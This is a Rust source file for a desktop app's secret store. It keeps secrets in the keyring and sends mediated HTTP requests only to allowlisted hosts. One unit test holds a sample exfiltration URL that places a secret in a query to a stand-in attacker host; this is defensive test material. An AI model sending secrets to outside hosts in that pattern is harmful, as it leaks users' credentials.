use keyring::Entry;
use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::hash_map::DefaultHasher;
use std::collections::BTreeMap;
use std::fs;
use std::hash::{Hash, Hasher};
use std::path::PathBuf;
use std::sync::Mutex;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretRef {
    pub id: String,
    pub scope: String,
    pub service: Option<String>,
    pub hint: String,
    pub configured: bool,
    pub created_at: u64,
    pub last_used_at: Option<u64>,
    /// Hosts secrets_use may deliver this secret to. Empty/absent means
    /// secrets_use is refused — mediation without an origin restriction
    /// would only hide the value, not prevent exfiltration.
    #[serde(default)]
    pub allowed_hosts: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretUseRequest {
    pub url: String,
    pub method: Option<String>,
    pub headers: Option<BTreeMap<String, String>>,
    pub body: Option<serde_json::Value>,
    pub timeout_ms: Option<u64>,
    pub allow_insecure: Option<bool>,
}

#[derive(Debug, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretUseResponse {
    pub status: u16,
    pub headers: BTreeMap<String, String>,
    pub body: String,
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

fn substitute_secret_text(value: &str, secret: &str) -> String {
    if secret.is_empty() {
        return value.to_string();
    }
    value.replace("${secret}", secret)
}

fn scrub_secret_text(value: &str, secret: &str) -> String {
    if secret.is_empty() {
        return value.to_string();
    }
    value.replace(secret, "[secret]")
}

fn substitute_secret_json(value: serde_json::Value, secret: &str) -> serde_json::Value {
    match value {
        serde_json::Value::String(text) => {
            serde_json::Value::String(substitute_secret_text(&text, secret))
        }
        serde_json::Value::Array(items) => serde_json::Value::Array(
            items
                .into_iter()
                .map(|item| substitute_secret_json(item, secret))
                .collect(),
        ),
        serde_json::Value::Object(map) => serde_json::Value::Object(
            map.into_iter()
                .map(|(key, value)| (key, substitute_secret_json(value, secret)))
                .collect(),
        ),
        other => other,
    }
}

/// Stable project fingerprint baked into keyring entry names. SHA-256 so a
/// toolchain upgrade can never silently orphan project-scoped secrets.
fn project_fingerprint(project_path: Option<&str>) -> String {
    let digest = Sha256::digest(project_path.unwrap_or(".").as_bytes());
    digest[..8]
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect()
}

/// Fingerprint used by builds that derived keyring names with DefaultHasher
/// (no cross-release stability guarantee). Kept only to migrate old entries.
fn legacy_project_fingerprint(project_path: Option<&str>) -> String {
    let mut hasher = DefaultHasher::new();
    project_path.unwrap_or(".").hash(&mut hasher);
    format!("{:016x}", hasher.finish())
}

fn keyring_user(scope: &str, project_path: Option<&str>, id: &str) -> String {
    if scope == "project" {
        format!(
            "polypore.{scope}.{}.{}",
            project_fingerprint(project_path),
            id
        )
    } else {
        format!("polypore.{scope}.{id}")
    }
}

fn entry(scope: &str, project_path: Option<&str>, id: &str) -> Result<Entry, String> {
    Entry::new("polypore", &keyring_user(scope, project_path, id))
        .map_err(|err| format!("keyring unavailable: {err}"))
}

/// Look up a secret value, distinguishing "not stored" (Ok(None)) from a
/// real keyring failure (Err). Project-scoped misses fall back to the
/// legacy DefaultHasher entry name and migrate it forward on hit.
fn lookup_secret(
    id: &str,
    scope: &str,
    project_path: Option<&str>,
) -> Result<Option<String>, String> {
    match entry(scope, project_path, id)?.get_password() {
        Ok(value) => Ok(Some(value)),
        Err(keyring::Error::NoEntry) => {
            if scope != "project" {
                return Ok(None);
            }
            let legacy_user = format!(
                "polypore.{scope}.{}.{}",
                legacy_project_fingerprint(project_path),
                id
            );
            let legacy = Entry::new("polypore", &legacy_user)
                .map_err(|err| format!("keyring unavailable: {err}"))?;
            match legacy.get_password() {
                Ok(value) => {
                    if let Ok(current) = entry(scope, project_path, id) {
                        if current.set_password(&value).is_ok() {
                            let _ = legacy.delete_credential();
                        }
                    }
                    Ok(Some(value))
                }
                Err(keyring::Error::NoEntry) => Ok(None),
                Err(_) => Ok(None),
            }
        }
        Err(err) => Err(format!("keyring error: {err}")),
    }
}

fn mask(_value: &str) -> String {
    "********".to_string()
}

fn config_dir() -> Result<PathBuf, String> {
    if let Ok(path) = std::env::var("POLYPORE_CONFIG_DIR") {
        return Ok(PathBuf::from(path));
    }
    if cfg!(windows) {
        std::env::var("APPDATA")
            .map(|base| PathBuf::from(base).join("polypore"))
            .map_err(|_| "APPDATA is not set".to_string())
    } else {
        std::env::var("HOME")
            .map(|base| PathBuf::from(base).join(".config").join("polypore"))
            .map_err(|_| "HOME is not set".to_string())
    }
}

fn metadata_path() -> Result<PathBuf, String> {
    Ok(config_dir()?.join("secret-refs.json"))
}

fn read_metadata() -> Result<Vec<SecretRef>, String> {
    let path = metadata_path()?;
    if !path.exists() {
        return Ok(Vec::new());
    }
    let raw = fs::read_to_string(&path)
        .map_err(|err| format!("failed to read {}: {err}", path.display()))?;
    serde_json::from_str(&raw).map_err(|err| format!("invalid secret metadata: {err}"))
}

fn write_metadata(items: &[SecretRef]) -> Result<(), String> {
    let path = metadata_path()?;
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .map_err(|err| format!("failed to create {}: {err}", parent.display()))?;
    }
    let raw = serde_json::to_string_pretty(items)
        .map_err(|err| format!("failed to encode secret metadata: {err}"))?;
    /* write-temp-then-rename so a crash mid-write can never corrupt the
    metadata file. */
    let tmp = path.with_extension("json.tmp");
    fs::write(&tmp, format!("{raw}\n"))
        .map_err(|err| format!("failed to write {}: {err}", tmp.display()))?;
    fs::rename(&tmp, &path).map_err(|err| format!("failed to replace {}: {err}", path.display()))
}

/* serializes metadata read-modify-write cycles so concurrent secrets_use
calls can't drop each other's updates. */
static METADATA_LOCK: Mutex<()> = Mutex::new(());

fn mutate_metadata<T>(apply: impl FnOnce(&mut Vec<SecretRef>) -> T) -> Result<T, String> {
    let _guard = METADATA_LOCK
        .lock()
        .map_err(|_| "secret metadata lock poisoned".to_string())?;
    let mut refs = read_metadata()?;
    let result = apply(&mut refs);
    write_metadata(&refs)?;
    Ok(result)
}

fn upsert_metadata(next: SecretRef) -> Result<SecretRef, String> {
    mutate_metadata(|refs| {
        refs.retain(|item| !(item.id == next.id && item.scope == next.scope));
        refs.push(next.clone());
    })?;
    Ok(next)
}

fn secret_value(id: &str, scope: &str, project_path: Option<&str>) -> Result<String, String> {
    lookup_secret(id, scope, project_path)?
        .ok_or_else(|| format!("secret not available: no entry for {id}"))
}

/// Resolve a secret handle to its raw value for trusted in-shell injection
/// (e.g. typing into a login field via the web driver). The value flows
/// shell→driver→page over a trusted stdio channel and never reaches the agent,
/// preserving the POLYPORE_AGENT_SCRUBBED trust model. Tries the requested
/// scope, else falls back project→user.
pub fn resolve_secret_for_injection(id: &str, scope: Option<&str>) -> Result<String, String> {
    let project = crate::project_context::active_project_root()
        .ok()
        .map(|path| path.display().to_string());
    let scopes: Vec<&str> = match scope {
        Some(scope) => vec![scope],
        None => vec!["project", "user"],
    };
    for scope in scopes {
        if let Ok(value) = secret_value(id, scope, project.as_deref()) {
            if !value.is_empty() {
                return Ok(value);
            }
        }
    }
    Err(format!("secret handle not configured: {id}"))
}

fn normalized_hosts(hosts: Option<Vec<String>>) -> Option<Vec<String>> {
    let hosts: Vec<String> = hosts?
        .into_iter()
        .map(|host| host.trim().to_ascii_lowercase())
        .filter(|host| !host.is_empty())
        .collect();
    if hosts.is_empty() {
        None
    } else {
        Some(hosts)
    }
}

#[tauri::command]
pub fn secrets_set(
    id: String,
    value: String,
    scope: Option<String>,
    service: Option<String>,
    allowed_hosts: Option<Vec<String>>,
    project_path: Option<String>,
) -> Result<SecretRef, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    if scope != "user" && scope != "project" {
        return Err("scope must be user or project".to_string());
    }
    if id.trim().is_empty() || value.is_empty() {
        return Err("secret id and value are required".to_string());
    }
    entry(&scope, project_path.as_deref(), &id)?
        .set_password(&value)
        .map_err(|err| format!("failed to store secret in keyring: {err}"))?;

    /* re-setting a handle without hosts keeps the hosts it already has. */
    let existing_hosts = read_metadata()
        .unwrap_or_default()
        .into_iter()
        .find(|item| item.id == id && item.scope == scope)
        .and_then(|item| item.allowed_hosts);

    upsert_metadata(SecretRef {
        id,
        scope,
        service,
        hint: mask(&value),
        configured: true,
        created_at: now_ms(),
        last_used_at: None,
        allowed_hosts: normalized_hosts(allowed_hosts).or(existing_hosts),
    })
}

/// Update the secrets_use host allowlist for an existing handle without
/// re-entering the value (needed for .env-discovered handles whose values
/// the user never typed).
#[tauri::command]
pub fn secrets_set_allowed_hosts(
    id: String,
    scope: Option<String>,
    allowed_hosts: Option<Vec<String>>,
) -> Result<SecretRef, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    let hosts = normalized_hosts(allowed_hosts);
    mutate_metadata(|refs| {
        for item in refs.iter_mut() {
            if item.id == id && item.scope == scope {
                item.allowed_hosts = hosts.clone();
                return Some(item.clone());
            }
        }
        None
    })?
    .ok_or_else(|| format!("no secret handle named {id} in scope {scope}"))
}

#[tauri::command]
pub fn secrets_list(
    scope: Option<String>,
    project_path: Option<String>,
) -> Result<Vec<SecretRef>, String> {
    let mut refs = read_metadata()?;
    refs.retain(|item| scope.as_ref().is_none_or(|wanted| &item.scope == wanted));
    for item in &mut refs {
        /* lookup_secret also migrates legacy-fingerprint entries forward. */
        item.configured = matches!(
            lookup_secret(&item.id, &item.scope, project_path.as_deref()),
            Ok(Some(_))
        );
    }
    Ok(refs)
}

#[tauri::command]
pub fn secrets_has(
    id: String,
    scope: Option<String>,
    project_path: Option<String>,
) -> Result<bool, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    Ok(secret_value(&id, &scope, project_path.as_deref()).is_ok())
}

#[tauri::command]
pub fn secrets_delete(
    id: String,
    scope: Option<String>,
    project_path: Option<String>,
) -> Result<bool, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    let deleted = entry(&scope, project_path.as_deref(), &id)?
        .delete_credential()
        .is_ok();
    let removed_meta = mutate_metadata(|refs| {
        let before = refs.len();
        refs.retain(|item| !(item.id == id && item.scope == scope));
        refs.len() != before
    })?;
    Ok(deleted || removed_meta)
}

#[tauri::command]
pub fn secrets_scrub(text: String, project_path: Option<String>) -> Result<String, String> {
    let mut scrubbed = text;
    for item in read_metadata()? {
        if let Ok(secret) = secret_value(&item.id, &item.scope, project_path.as_deref()) {
            if !secret.is_empty() {
                scrubbed = scrubbed.replace(&secret, "[secret]");
            }
        }
    }
    Ok(scrubbed)
}

/// Match a request host against an allowlist entry. Entries are exact
/// hostnames, or `*.example.com` to cover any subdomain (and the apex).
fn host_allowed(allowed: &[String], host: &str) -> bool {
    let host = host.to_ascii_lowercase();
    allowed.iter().any(|pattern| {
        let pattern = pattern.trim().to_ascii_lowercase();
        if pattern.is_empty() {
            return false;
        }
        if let Some(suffix) = pattern.strip_prefix("*.") {
            return host == suffix || host.ends_with(&format!(".{suffix}"));
        }
        host == pattern
    })
}

fn is_loopback_host(host: &str) -> bool {
    matches!(host, "localhost" | "127.0.0.1" | "::1" | "[::1]")
}

#[tauri::command]
pub fn secrets_use(
    id: String,
    request: SecretUseRequest,
    scope: Option<String>,
    project_path: Option<String>,
) -> Result<SecretUseResponse, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    let secret = secret_value(&id, &scope, project_path.as_deref())?;
    let url = substitute_secret_text(&request.url, &secret);
    let parsed = reqwest::Url::parse(&url)
        .map_err(|err| scrub_secret_text(&format!("invalid url: {err}"), &secret))?;
    let host = parsed
        .host_str()
        .ok_or_else(|| "url must include a host".to_string())?
        .to_string();
    /* the mediated-request design only prevents exfiltration if each handle
    is pinned to the hosts it may be delivered to. no allowlist → refuse. */
    let allowed_hosts = read_metadata()?
        .into_iter()
        .find(|item| item.id == id && item.scope == scope)
        .and_then(|item| item.allowed_hosts)
        .unwrap_or_default();
    if allowed_hosts.is_empty() {
        return Err(format!(
            "secret \"{id}\" has no allowed hosts configured — add the API hosts it may be sent to in the Secrets panel, then retry"
        ));
    }
    if !host_allowed(&allowed_hosts, &host) {
        return Err(scrub_secret_text(
            &format!("secrets.use blocked: host {host} is not in the allowed hosts for \"{id}\""),
            &secret,
        ));
    }
    match parsed.scheme() {
        "https" => {}
        "http" if request.allow_insecure == Some(true) && is_loopback_host(&host) => {}
        "http" => {
            return Err(
                "plain http is only allowed to localhost with allow_insecure: true".to_string(),
            )
        }
        other => return Err(format!("unsupported url scheme: {other}")),
    }

    let timeout_ms = request.timeout_ms.unwrap_or(30_000).min(120_000);
    let client = Client::builder()
        .timeout(Duration::from_millis(timeout_ms))
        .build()
        .map_err(|err| format!("failed to build http client: {err}"))?;

    let method = request.method.unwrap_or_else(|| "GET".to_string());
    let mut headers = HeaderMap::new();
    for (key, value) in request.headers.unwrap_or_default() {
        let name = HeaderName::from_bytes(key.as_bytes())
            .map_err(|err| format!("invalid header name: {err}"))?;
        let value = HeaderValue::from_str(&substitute_secret_text(&value, &secret))
            .map_err(|err| format!("invalid header value: {err}"))?;
        headers.insert(name, value);
    }

    let mut builder = client
        .request(
            method
                .parse()
                .map_err(|err| format!("invalid http method: {err}"))?,
            &url,
        )
        .headers(headers);
    if let Some(body) = request.body {
        builder = builder.json(&substitute_secret_json(body, &secret));
    }

    let response = builder
        .send()
        .map_err(|err| format!("secret request failed: {err}"))?;
    let status = response.status().as_u16();
    let headers = response
        .headers()
        .iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                scrub_secret_text(value.to_str().unwrap_or(""), &secret),
            )
        })
        .collect();
    let body_text = response
        .text()
        .map_err(|err| format!("failed to read response body: {err}"))?;
    let body = scrub_secret_text(&body_text, &secret);

    /* best-effort usage timestamp; the lock keeps concurrent uses from
    dropping each other's updates. */
    let _ = mutate_metadata(|refs| {
        for item in refs.iter_mut() {
            if item.id == id && item.scope == scope {
                item.last_used_at = Some(now_ms());
            }
        }
    });

    Ok(SecretUseResponse {
        status,
        headers,
        body,
    })
}

#[tauri::command]
pub fn secrets_reveal(
    id: String,
    scope: Option<String>,
    project_path: Option<String>,
) -> Result<Option<String>, String> {
    let scope = scope.unwrap_or_else(|| "user".to_string());
    /* a locked/unavailable keyring surfaces as Err — conflating it with
    "not found" would read to users as "my secret disappeared". */
    lookup_secret(&id, &scope, project_path.as_deref())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;

    /* tests below mutate POLYPORE_CONFIG_DIR, which is process-global state;
    cargo test runs tests on parallel threads, so every test that touches
    the env var (or the metadata file behind it) must hold this lock. */
    static ENV_LOCK: Mutex<()> = Mutex::new(());

    fn env_guard() -> std::sync::MutexGuard<'static, ()> {
        ENV_LOCK
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
    }

    #[test]
    fn mask_is_fixed_width_for_ascii_and_unicode_values() {
        assert_eq!(mask("sk-ant-secret"), "********");
        assert_eq!(mask("🔐🔐🔐🔐🔐"), "********");
        assert_eq!(mask("短い秘密"), "********");
    }

    #[test]
    fn project_keyring_user_includes_project_fingerprint() {
        let one = keyring_user("project", Some("/tmp/one"), "api-key");
        let two = keyring_user("project", Some("/tmp/two"), "api-key");
        let user = keyring_user("user", Some("/tmp/one"), "api-key");

        assert_ne!(one, two);
        assert!(one.starts_with("polypore.project."));
        assert_eq!(user, "polypore.user.api-key");
    }

    #[test]
    fn project_fingerprint_is_stable_across_builds() {
        /* pinned digest prefix: a toolchain upgrade must not change keyring
        entry names (that orphans every project-scoped secret). */
        assert_eq!(project_fingerprint(Some("/tmp/one")), "02c3a714b58d860c");
        assert_eq!(project_fingerprint(None), project_fingerprint(Some(".")));
    }

    #[test]
    fn host_allowlist_matches_exact_and_wildcard_patterns() {
        let allowed = vec!["api.github.com".to_string(), "*.example.com".to_string()];
        assert!(host_allowed(&allowed, "api.github.com"));
        assert!(host_allowed(&allowed, "API.GITHUB.COM"));
        assert!(host_allowed(&allowed, "example.com"));
        assert!(host_allowed(&allowed, "sub.example.com"));
        assert!(!host_allowed(&allowed, "github.com"));
        assert!(!host_allowed(&allowed, "evil-example.com"));
        assert!(!host_allowed(&allowed, "attacker.test"));
        assert!(!host_allowed(&[], "api.github.com"));
    }

    #[test]
    fn secrets_use_refuses_handles_without_allowed_hosts() {
        let _guard = env_guard();
        let tmp_config = tempfile::tempdir().expect("tempdir");
        env::set_var("POLYPORE_CONFIG_DIR", tmp_config.path().to_str().unwrap());
        let project_path = Some("/tmp/polypore-test-use-no-hosts".to_string());

        secrets_set(
            "use-key".to_string(),
            "use-value".to_string(),
            Some("project".to_string()),
            None,
            None,
            project_path.clone(),
        )
        .expect("secrets_set");

        let result = secrets_use(
            "use-key".to_string(),
            SecretUseRequest {
                url: "https://attacker.example/?t=${secret}".to_string(),
                method: None,
                headers: None,
                body: None,
                timeout_ms: None,
                allow_insecure: None,
            },
            Some("project".to_string()),
            project_path.clone(),
        );

        let _ = secrets_delete(
            "use-key".to_string(),
            Some("project".to_string()),
            project_path,
        );
        env::remove_var("POLYPORE_CONFIG_DIR");

        let err = result.expect_err("secrets_use must refuse without an allowlist");
        assert!(err.contains("no allowed hosts"), "unexpected error: {err}");
    }

    #[test]
    fn secret_substitution_and_scrubbing_cover_url_headers_and_body() {
        let secret = "sk-test-secret";
        assert_eq!(
            substitute_secret_text("https://api.example.test?token=${secret}", secret),
            "https://api.example.test?token=sk-test-secret"
        );
        assert_eq!(
            scrub_secret_text("x-secret: sk-test-secret", secret),
            "x-secret: [secret]"
        );
        let body = serde_json::json!({
            "token": "${secret}",
            "nested": ["Bearer ${secret}", { "raw": "${secret}" }],
            "count": 1
        });
        assert_eq!(
            substitute_secret_json(body, secret),
            serde_json::json!({
                "token": "sk-test-secret",
                "nested": ["Bearer sk-test-secret", { "raw": "sk-test-secret" }],
                "count": 1
            })
        );
    }

    /// C1 — secrets_reveal_returns_value_after_set
    /// Use project scope with a stable test path so the keyring key is
    /// deterministic and isolated from user secrets.  A tempdir for
    /// POLYPORE_CONFIG_DIR keeps the metadata JSON off the real filesystem.
    #[test]
    fn secrets_reveal_returns_value_after_set() {
        let _guard = env_guard();
        let tmp_config = tempfile::tempdir().expect("tempdir");
        env::set_var("POLYPORE_CONFIG_DIR", tmp_config.path().to_str().unwrap());
        let project_path = Some("/tmp/polypore-test-c1-reveal".to_string());

        // Set the secret.
        let set_result = secrets_set(
            "c1-key".to_string(),
            "c1-value".to_string(),
            Some("project".to_string()),
            None,
            None,
            project_path.clone(),
        );
        assert!(set_result.is_ok(), "secrets_set failed: {:?}", set_result);

        // Reveal the secret — stub returns None, so this should fail.
        let reveal_result = secrets_reveal(
            "c1-key".to_string(),
            Some("project".to_string()),
            project_path.clone(),
        );

        // Clean up keyring entry so we don't litter the OS keyring.
        let _ = secrets_delete(
            "c1-key".to_string(),
            Some("project".to_string()),
            project_path,
        );
        env::remove_var("POLYPORE_CONFIG_DIR");

        assert_eq!(reveal_result, Ok(Some("c1-value".to_string())));
    }

    /// C2 — secrets_reveal_returns_none_when_missing
    /// A secret that was never set → Ok(None), NOT Err.
    #[test]
    fn secrets_reveal_returns_none_when_missing() {
        let reveal_result = secrets_reveal(
            "c2-never-set-key-xzy987".to_string(),
            Some("project".to_string()),
            Some("/tmp/polypore-test-c2-missing".to_string()),
        );
        assert_eq!(reveal_result, Ok(None));
    }

    /// C3 — secrets_reveal_respects_project_scope
    /// Set with scope=project + project_path="X".
    /// Reveal without project_path → Ok(None) (different keyring user).
    /// Reveal with matching project_path → Ok(Some(value)).
    #[test]
    fn secrets_reveal_respects_project_scope() {
        let _guard = env_guard();
        let tmp_config = tempfile::tempdir().expect("tempdir");
        std::env::set_var("POLYPORE_CONFIG_DIR", tmp_config.path().to_str().unwrap());
        let project_path_x = Some("/tmp/polypore-test-c3-scope-x".to_string());

        // Set the secret with project scope and a specific project path.
        let set_result = secrets_set(
            "c3-scoped-key".to_string(),
            "c3-scoped-value".to_string(),
            Some("project".to_string()),
            None,
            None,
            project_path_x.clone(),
        );
        assert!(set_result.is_ok(), "secrets_set failed: {:?}", set_result);

        // Reveal WITHOUT the project_path → should not find it
        // (project scope includes path fingerprint, so no path → different key).
        let reveal_no_path = secrets_reveal(
            "c3-scoped-key".to_string(),
            Some("project".to_string()),
            None,
        );
        // Reveal WITH a DIFFERENT project_path → also should not find it.
        let reveal_wrong_path = secrets_reveal(
            "c3-scoped-key".to_string(),
            Some("project".to_string()),
            Some("/tmp/polypore-test-c3-scope-y".to_string()),
        );
        // Reveal WITH the matching project_path → should return the value.
        let reveal_correct_path = secrets_reveal(
            "c3-scoped-key".to_string(),
            Some("project".to_string()),
            project_path_x.clone(),
        );

        // Clean up keyring entry.
        let _ = secrets_delete(
            "c3-scoped-key".to_string(),
            Some("project".to_string()),
            project_path_x,
        );
        std::env::remove_var("POLYPORE_CONFIG_DIR");

        assert_eq!(
            reveal_no_path,
            Ok(None),
            "reveal without project_path should return None"
        );
        assert_eq!(
            reveal_wrong_path,
            Ok(None),
            "reveal with wrong project_path should return None"
        );
        assert_eq!(
            reveal_correct_path,
            Ok(Some("c3-scoped-value".to_string())),
            "reveal with correct project_path should return value"
        );
    }
}
